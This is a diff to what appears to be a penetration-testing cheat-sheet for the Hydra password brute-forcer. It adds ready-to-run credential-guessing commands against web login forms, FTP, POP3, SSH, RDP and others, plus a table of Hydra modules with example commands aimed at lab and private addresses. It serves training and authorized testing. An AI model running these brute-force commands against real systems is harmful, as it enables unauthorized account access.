@@ -65,13 +65,34 @@ hydra -U http-post-form
 hydra -l pentester -P /usr/share/wordlists/metasploit/password.lst zev0nlxhh78mfshrhzvq9h8vm.eu-central-4.attackdefensecloudlabs.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:S=Success"
 
 
+# Another example of a login form:
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.63.111 -s 47017 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+# username=^USER^&password=^PASS^: The form parameters with placeholders for Hydra.
+# F=Invalid credentials: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.
+
+
+
 # Example for ftp in a non default port
 hydra -L users.txt -P pass.txt ftp://$ip:2121
+
+# Port: Specify a non-default port for the target service.
+hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
+# Target the FTP service on ftp.example.com via port 2121.
+# Use the ftp module and provide verbose output (-V) for detailed monitoring.
+
 
 # Attacking a pop3 service
 hydra -L users.txt -p 'Company01!' -f $ip pop3
 
+# Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.	
+hydra -t 4 ...
 
+
+# Targeting Multiple SSH Servers
+hydra -l $username -p $password -M targets.txt ssh
+
+# Testing a RDP connection with a username Administrator and a password consisting of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers
+hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
 
 ```
 
@@ -86,3 +107,16 @@ hydra 192.168.1.45 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/P
 hydra -l student -P /usr/share/wordlists/rockyou.txt  ssh://192.153.213.3
 ```
 
+
+| Hydra Service | Service/Protocol                 | Description                                                                                             | Example Command                                                                                                |
+| ------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
+| ftp           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
+| ssh           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
+| http-get/post | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
+| smtp          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
+| pop3          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
+| imap          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
+| mysql         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                            |
+| mssql         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
+| vnc           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
+| rdp           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |
